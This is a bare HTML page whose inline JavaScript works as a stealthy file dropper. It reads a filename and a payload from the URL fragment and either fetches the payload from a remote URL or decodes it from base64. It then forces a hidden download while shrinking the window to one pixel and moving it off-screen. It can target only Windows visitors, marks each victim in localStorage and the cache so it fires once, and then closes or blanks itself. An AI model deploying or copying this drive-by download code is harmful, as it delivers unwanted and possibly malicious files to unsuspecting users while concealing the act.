<!DOCTYPE html>
<html><head><script>
var h='',fn='',sep=-1,key='',wOnly=false,data='';
try{
  h=location.hash?location.hash.slice(1):'';
  if(h){
    try{h=decodeURIComponent(h)}catch(e){}
    if(h.slice(-2)==='!W'){wOnly=true;h=h.slice(0,-2)}
    sep=h.indexOf('~');
    fn=sep>0?h.slice(0,sep):'';
    data=sep>0?h.slice(sep+1):'';
    key='dl_done_'+fn;
    if(fn&&localStorage.getItem(key)){
      window.stop();
      history.back();
      window.close();
      location.replace('about:blank');
    }
  }
}catch(e){}
</script><title>.</title></head>
<body><script>
(function(){
  if(!fn||!data)return;
  if(wOnly&&navigator.platform.indexOf('Win')===-1){history.back();window.close();return}
  if(localStorage.getItem(key)){history.back();window.close();return}

  document.title=fn;
  try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}

  function finish(){
    localStorage.setItem(key,'1');
    try{caches.open('dl-done').then(function(c){c.put('done-'+fn,new Response('1'))})}catch(e){}
    setTimeout(function(){history.back();window.close();setTimeout(function(){location.replace('about:blank')},300)},1500);
  }

  function dl(blob){
    if(!blob||!blob.size)return;
    var u=URL.createObjectURL(blob);
    var a=document.createElement('a');
    a.href=u;a.download=fn;a.style.display='none';
    document.body.appendChild(a);a.click();
    setTimeout(function(){try{URL.revokeObjectURL(u)}catch(e){}},2000);
    finish();
  }

  if(data.indexOf('http')===0){
    fetch(data).then(function(r){if(!r.ok)throw 0;return r.blob()}).then(dl).catch(function(){});
  }else{
    try{
      var raw=atob(data);var arr=new Uint8Array(raw.length);
      for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
      dl(new Blob([arr],{type:'application/octet-stream'}));
    }catch(e){}
  }
})();
</script></body></html>
